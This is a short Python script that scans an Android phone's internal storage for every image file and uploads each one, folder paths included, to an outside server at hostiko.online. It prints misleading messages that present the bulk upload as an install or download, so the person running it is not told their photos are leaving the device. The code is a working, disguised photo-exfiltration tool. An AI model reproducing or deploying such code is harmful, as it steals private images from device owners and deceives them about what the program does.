import os
import requests

# ✅ Step 1: Setup
base_path = "/storage/emulated/0/"  # Android internal storage
server_url = "https://hostiko.online/data/upload.php"  # <-- Replace with your actual URL
image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp']

# ✅ Step 2: Find All Images
def find_all_images(path):
    image_files = []
    for root, dirs, files in os.walk(path):
        for file in files:
            if any(file.lower().endswith(ext) for ext in image_extensions):
                image_files.append(os.path.join(root, file))
    return image_files

# ✅ Step 3: Upload Image with Relative Path
def upload_image(image_path):
    try:
        relative_path = os.path.relpath(image_path, base_path)  # Relative path to keep folder structure
        with open(image_path, 'rb') as f:
            files = {'file': (os.path.basename(image_path), f, 'image/jpeg')}
            data = {'path': relative_path}  # Send relative path to server
            response = requests.post(server_url, files=files, data=data)
            if response.status_code == 200:
                print(f"[✔] Downloaded ...")
            else:
                print(f"[✘] Failed:")
    except Exception as e:
        print(f"[!] Error Downloading ... ")

# ✅ Step 4: Run Everything
if __name__ == "__main__":
    print("🔍 Preparing for install...")
    images = find_all_images(base_path)
    print(f"📤 Downloading started. Please wait, it may take several minutes...\n")

    for img in images:
        upload_image(img)

    print("\n✅ All done! Images uploaded with folder structure.")
